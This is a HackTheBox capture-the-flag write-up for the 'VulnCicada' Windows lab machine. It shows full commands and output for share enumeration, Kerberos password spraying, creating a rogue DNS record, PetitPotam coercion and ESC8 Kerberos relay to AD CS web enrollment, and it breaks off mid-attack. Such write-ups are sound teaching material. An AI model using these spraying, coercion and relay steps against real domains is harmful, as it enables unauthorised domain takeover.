---
title: "HTB: VulnCicada"
date: 2026-07-05
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "SMB Enumeration", "ADCS", "ESC8"]
categories: ["Writeups"]
description: "VulnCicada involves the discovery of credentials in a public share, ADCS ESC8 exploitation through Kerberos authentication relay, certificate-based machine account authentication, and Administrator NTLM hash extraction to achieve full domain compromise."
---

# 🚩 Box Name: VulnCicada

## 📋 Initial Info
- **Hostname:** `cicada.vl`

**VulnCicada** is a medium-difficulty Windows Active Directory machine that focuses on certificate abuse in ADCS. The attack starts by finding a hidden password embedded inside an image stored on a public network share. That password leads to further enumeration, where I discover the environment is vulnerable to the **ESC8** certificate attack.

By exploiting this misconfiguration, I can relay Kerberos authentication to the Certificate Authority and request a certificate as the machine account, bypassing the usual self-relay protections. Once I have that certificate, I authenticate as the machine, dump the domain Administrator's NTLM hash, and gain complete control of the Active Directory domain.

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

The first thing I do is throw an aggressive Nmap scan at the target. I want to know every TCP port that's listening, identify the services running on them, and grab as much version information as possible.

The scan immediately tells me this isn't just another Windows server it's a Domain Controller.
#### nmap Scan
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-05 14:19 CDT
Nmap scan report for 10.129.234.48
Host is up (0.060s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-05 19:21:02Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-05T19:06:38
|_Not valid after:  2027-07-05T19:06:38
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-05T19:06:38
|_Not valid after:  2027-07-05T19:06:38
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-05T19:06:38
|_Not valid after:  2027-07-05T19:06:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-05T19:06:38
|_Not valid after:  2027-07-05T19:06:38
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-05T19:22:35+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-07-04T19:14:22
|_Not valid after:  2027-01-03T19:14:22
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49766/tcp open  msrpc         Microsoft Windows RPC
50031/tcp open  msrpc         Microsoft Windows RPC
57522/tcp open  msrpc         Microsoft Windows RPC
58831/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58833/tcp open  msrpc         Microsoft Windows RPC
58850/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-05T19:21:56
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   60.45 ms 10.10.14.1
2   60.55 ms 10.129.234.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.16 seconds
```

Some of the biggest clues are:

* **Kerberos (88)** – Used for Active Directory authentication.
* **LDAP (389, 636, 3268, 3269)** – Used to query Active Directory.
* **SMB (445)** – Always worth investigating on Windows machines.
* **DNS (53)** – The server is also acting as the domain's DNS server.
* **RDP (3389)** – Remote Desktop is enabled.
* **RPC** and several high-numbered RPC ports – Typical behavior for a Windows Domain Controller.

One thing that immediately catches my eye is the domain name:
```
cicada.vl
```

The LDAP certificate also reveals the hostname:
```
DC-JPQ225.cicada.vl
```

That gives me everything I need to start interacting with the domain properly.

Another interesting service is **NFS (2049)**. Seeing an NFS share on a Windows Domain Controller is unusual. It's definitely something I'll come back to later.

At this point I don't have any credentials, but I already know this machine is heavily tied into Active Directory, so enumeration will mostly revolve around the domain rather than the IIS web server.
### DNS Enumeration

Since the machine is hosting DNS, I query it directly.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ dig any cicada.vl @10.129.234.48                                                                                                                                          ──(Sun,Jul05)─┘

; <<>> DiG 9.20.23-1~deb13u1-Debian <<>> any cicada.vl @10.129.234.48
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4358
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;cicada.vl.                     IN      ANY

;; ANSWER SECTION:
cicada.vl.              600     IN      A       10.129.234.48
cicada.vl.              3600    IN      NS      dc-jpq225.cicada.vl.
cicada.vl.              3600    IN      SOA     dc-jpq225.cicada.vl. hostmaster.cicada.vl. 219 900 600 86400 3600
cicada.vl.              600     IN      AAAA    dead:beef::7416:9c9:e61d:3096
cicada.vl.              600     IN      AAAA    dead:beef::245
cicada.vl.              600     IN      AAAA    dead:beef::4703:fe51:d7da:ccaf

;; ADDITIONAL SECTION:
dc-jpq225.cicada.vl.    3600    IN      A       10.129.234.48
dc-jpq225.cicada.vl.    3600    IN      AAAA    dead:beef::7416:9c9:e61d:3096

;; Query time: 61 msec
;; SERVER: 10.129.234.48#53(10.129.234.48) (TCP)
;; WHEN: Sun Jul 05 14:26:42 CDT 2026
;; MSG SIZE  rcvd: 253
```


The response confirms several useful details:

* The domain is **cicada.vl**.
* The Domain Controller is **dc-jpq225.cicada.vl**.
* The Domain Controller's IP address is **10.129.234.48**.

Whenever I'm working with Active Directory, proper name resolution makes life much easier. Many AD tools expect hostnames instead of raw IP addresses, so I add the domain to my local hosts file.

### 🌐 Web Enumeration

Browsing to port **80** doesn't reveal much. The server is simply hosting the default IIS landing page.

![IIS Port 80](/images/vulncicada/IIS80.png)


No login portal. No hidden directories. No forgotten developer notes saying "password is Password123".

With nothing interesting on the web server, I move on.
### SMB Enumeration

SMB is always worth checking on Windows targets, so I first see whether anonymous or Guest access is allowed.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb cicada.vl -u '' -p ''                                                                                                                                             ──(Sun,Jul05)─┘
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\: STATUS_NOT_SUPPORTED
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb cicada.vl -u 'GUEST' -p ''                                                                                                                                        ──(Sun,Jul05)─┘
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\GUEST: STATUS_NOT_SUPPORTED
```

No luck. Both attempts fail with `STATUS_NOT_SUPPORTED`. At first glance this looks a little strange, but the Nmap scan already gave me the answer. `NTLM: False`.

This environment has **NTLM authentication disabled**, meaning the server won't accept traditional username/password authentication over SMB. Instead, authentication must be performed using **Kerberos**.

That changes my game plan. Rather than attempting NTLM-based attacks or anonymous SMB enumeration, I'll need to obtain valid domain credentials before I can go much further.

**Kerberos is the only way in.**

### 📂 NFS Shares

From the Nmap scan I go back to the exposed **NFS share**. It's unusual for a Windows Domain Controller, so I decide to see what's being shared.

First, I list the available exports.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo showmount -e 10.129.234.48                                       1 ↵ ──(Sun,Jul05)─┘
Export list for 10.129.234.48:
/profiles (everyone)
```

The server returns a single share.

The word **everyone** immediately grabs my attention. Whenever I see that, I assume there might be something interesting hiding inside.

I mount the share locally so I can explore it like a normal directory.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ mkdir target-NFS                                                          ──(Sun,Jul05)─┘
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo mount -t nfs 10.129.234.48:/ ./target-NFS -o nolock                  ──(Sun,Jul05)─┘
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ cd target-NFS                                                             ──(Sun,Jul05)─┘
┌─[split@parrot:~/Documents/HTB/VulnCicada/target-NFS]
└─❯ ls                                                                        ──(Sun,Jul05)─┘
profiles
```

Inside I find a directory named `profiles`. Running a quick directory tree shows several user profile folders.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada/target-NFS]
└─❯ tree profiles                                                             ──(Sun,Jul05)─┘
profiles
├── Administrator
│   ├── Documents  [error opening dir]
│   └── vacation.png
├── Daniel.Marshall
├── Debra.Wright
├── Jane.Carter
├── Jordan.Francis
├── Joyce.Andrews
├── Katie.Ward
├── Megan.Simpson
├── Richard.Gibbons
├── Rosie.Powell
│   ├── Documents  [error opening dir]
│   └── marketing.png
└── Shirley.West

14 directories, 2 files
```

Two image files immediately stand out:
* `vacation.png`
* `marketing.png`

The usernames are valuable by themselves, so I save them into a `users` file for later. Good password spraying starts with a good username list.

Then I open `marketing.png`.

Jackpot.

Someone has left a sticky note containing a password.

![Image of Password](/images/vulncicada/passwordimage.png)


`Cicada123`.

### 🔑 Password Spraying

Now that I have a list of usernames and a password, it's time to see whether anyone reused it. Since NTLM authentication is disabled on this machine, I perform the spray using **Kerberos**.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc smb DC-JPQ225.cicada.vl -u 'users' -p 'Cicada123' -k                                                                                                                  ──(Sun,Jul05)─┘
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Shirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```

Most accounts fail with:

```text
KDC_ERR_PREAUTH_FAILED
```

This simply means the username exists, but the password is incorrect. One account, however, authenticates successfully.

```text
Rosie.Powell : Cicada123
```

That's my foothold.

### 📁 Enumerating SMB Shares

With valid credentials, I can finally enumerate the SMB shares available to Rosie. Rosie has access to several shares.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k --shares                                                                                                  ──(Sun,Jul05)─┘
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
```

The one that immediately catches my attention is **CertEnroll**.

Windows creates this share when **Active Directory Certificate Services (AD CS)** is installed. I don't know if it's vulnerable yet, but its mere existence tells me certificates are going to play a role somewhere in this box.

I connect using Impacket's SMB client to take a closer look.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ smbclient.py -k cicada.vl/rosie.powell:'Cicada123'@DC-JPQ225.cicada.vl                                                                                                    ──(Sun,Jul05)─┘
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands

# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL

# use CertEnroll
# ls
drw-rw-rw-          0  Sun Jul  5 14:20:35 2026 .
drw-rw-rw-          0  Fri Sep 13 10:17:59 2024 ..
-rw-rw-rw-        741  Sun Jul  5 14:15:22 2026 cicada-DC-JPQ225-CA(1)+.crl
-rw-rw-rw-        941  Sun Jul  5 14:15:22 2026 cicada-DC-JPQ225-CA(1).crl
<SNIP>
```

Inside the `CertEnroll` share I find Certificate Revocation Lists (CRLs), which confirms that AD CS is indeed configured on the Domain Controller.

At this point I suspect certificates may eventually become important, but I don't have enough information yet. Rather than jumping to conclusions, I decide to map the Active Directory environment first.

### 🩸 BloodHound Collection

Whenever I gain domain credentials, one of my first priorities is collecting BloodHound data. BloodHound excels at finding relationships that are almost impossible to spot manually.

I collect the domain data using RustHound-CE.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada/Bloodhound_Data]
└─❯ rusthound-ce -d cicada.vl -i 10.129.234.48 -u rosie.powell -p 'Cicada123' -v                                                                                              ──(Sun,Jul05)─┘
---------------------------------------------------
Initializing RustHound-CE at 15:38:54 on 07/05/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-07-05T20:38:54Z INFO  rusthound_ce] Verbosity level: Debug
<SNIP>

RustHound-CE Enumeration Completed at 15:39:02 on 07/05/26! Happy Graphing!
```


After importing the data into BloodHound, one area immediately jumps out at me.

![IIS Port 80](/images/vulncicada/BHdata.png)

Several objects related to **Active Directory Certificate Services** stand out in the graph. Looks like my suspicion about the `CertEnroll` are correct.

### 🪪 Enumerating Active Directory Certificate Services

Before attempting any certificate attacks, I first confirm that AD CS is actually present.

NetExec makes this easy.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc ldap DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -M adcs                                                                                                  ──(Sun,Jul05)─┘
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123
ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225        Found PKI Enrollment Server: DC-JPQ225.cicada.vl
ADCS        DC-JPQ225.cicada.vl 389    DC-JPQ225        Found CN: cicada-DC-JPQ225-CA
```

The module discovers a single Certificate Authority.

```text
CA Name: cicada-DC-JPQ225-CA
```


Certipy-ad is one of the best tools for enumerating Active Directory Certificate Services because it automatically identifies common certificate misconfigurations and attack paths.

```shell
┌─[split@parrot:~/Tools/Bloodhound]
└─❯ certipy-ad find -vulnerable -u rosie.powell@cicada.vl -p 'Cicada123' -dc-host DC-JPQ225.cicada.vl -dc-ip 10.129.234.48 -stdout -k --debug                                 ──(Sun,Jul05)─┘
Certipy v5.0.4 - by Oliver Lyak (ly4k)

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 17FBE495701924944CDA860008330C9A
    Certificate Validity Start          : 2026-07-05 19:10:25+00:00
    Certificate Validity End            : 2526-07-05 19:20:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```


After several seconds of enumeration, Certipy reports exactly what I was hoping to find.

```text
ESC8 : Web Enrollment is enabled over HTTP
```

This is a huge finding.

The Certificate Authority's **Web Enrollment** feature is available over plain HTTP instead of HTTPS, making it vulnerable to the **ESC8** attack.

I don't exploit it just yet, but now I know exactly where this machine is leading me. The rest of the attack path will revolve around abusing Active Directory Certificate Services to escalate my privileges.

---

## ⚡ Exploitation (Privilege Escalation via ESC8)
### Understanding ESC8

Earlier, Certipy-ad reported that the Certificate Authority is vulnerable to **ESC8**. Before exploiting it, it's worth understanding what that actually means.

Normally, **Active Directory Certificate Services (AD CS)** allows domain users and computers to request certificates. Those certificates can then be used to authenticate to the domain instead of using a password. The problem is that this Certificate Authority exposes its **Web Enrollment** page over **HTTP** rather than HTTPS.

Because HTTP doesn't protect the authentication process, an attacker can **relay** an incoming authentication request to the Certificate Authority and trick it into issuing a certificate for the victim. If that victim happens to be a **Domain Controller**, you've essentially convinced the CA to hand you the Domain Controller's identity.

### Authentication Coercion

This is where **authentication coercion** comes in.

Authentication coercion abuses various Windows protocols to force another computer to authenticate to a system I control. The victim isn't logging in voluntarily—I'm triggering a legitimate Windows feature that causes it to reach out to me automatically.

Before going any further, I check whether the domain allows users to create new machine accounts.

```shell
┌─[split@parrot:~/Tools/Bloodhound]
└─❯ nxc ldap DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -M maq                                                                                               2 ↵ ──(Sun,Jul05)─┘
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] Getting the MachineAccountQuota
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        MachineAccountQuota: 10
```

The result shows:

```text
MachineAccountQuota: 10
```

This is the default Active Directory configuration, meaning normal users are allowed to create up to ten computer objects in the domain. That turns out to be useful for the Kerberos relay technique I'll be using.

Next, I verify that the Domain Controller is actually vulnerable to authentication coercion.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc smb DC-JPQ225.cicada.vl -u 'rosie.powell' -p 'Cicada123' -k -M coerce_plus                                                                                            ──(Sun,Jul05)─┘
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
```

The results show several coercion techniques are available.

### Creating a Rogue DNS Record

Kerberos is very particular about hostnames. To convince the Domain Controller to authenticate to me, I first create a DNS record that points to my attack machine.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.182         ──(Mon,Jul06)─┘
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```


Afterward, I verify that the record resolves correctly.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nslookup DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl 10.129.234.48                                                                                1 ↵ ──(Mon,Jul06)─┘
Server:         10.129.234.48
Address:        10.129.234.48#53

Name:   DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl
Address: 10.10.14.182
```

The DNS server returns my VPN IP, confirming everything is pointing where it should.

### Relaying the Kerberos Authentication

The traditional ESC8 attack relies on **NTLM relay**. Unfortunately for me, this domain disabled NTLM authentication during reconnaissance, so that technique is off the table. Instead, I perform a **Kerberos relay** attack.

The overall process looks like this:

1. Force the Domain Controller to authenticate to my machine.
2. Capture that Kerberos authentication.
3. Relay it directly to the vulnerable AD CS Web Enrollment endpoint.
4. Request a **Domain Controller** certificate on the victim's behalf.

To receive the incoming authentication, I start Certipy-ad in relay mode.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController                                                                
```

Then, from another terminal, I trigger the authentication using **PetitPotam**.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```


The Domain Controller immediately authenticates back to my relay server but it fails.

After digging through the debug output, I discover the problem: Certipy-ad tries to automatically build the certificate request using the relayed username, but in this case the username is empty. No username. No certificate.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController                                                                                    ──(Mon,Jul06)─┘
[sudo] password for split:
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://dc-jpq225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] (SMB): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[-] Error during web certificate request: timed out
[-] Use -debug to print a stacktrace
[*] Exiting...
```


### Second Time's the Charm

Fortunately, the fix is straightforward. Instead of allowing Certipy-ad to generate the certificate subject automatically, I provide it myself.

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ sudo certipy-ad relay -target http://dc-jpq225.cicada.vl/ -template DomainController -subject CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl -debug
```

Once the relay server is set up, I launch the PetitPotam coercion attack again..

```shell
┌─[split@parrot:~/Documents/HTB/VulnCicada]
└─❯ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
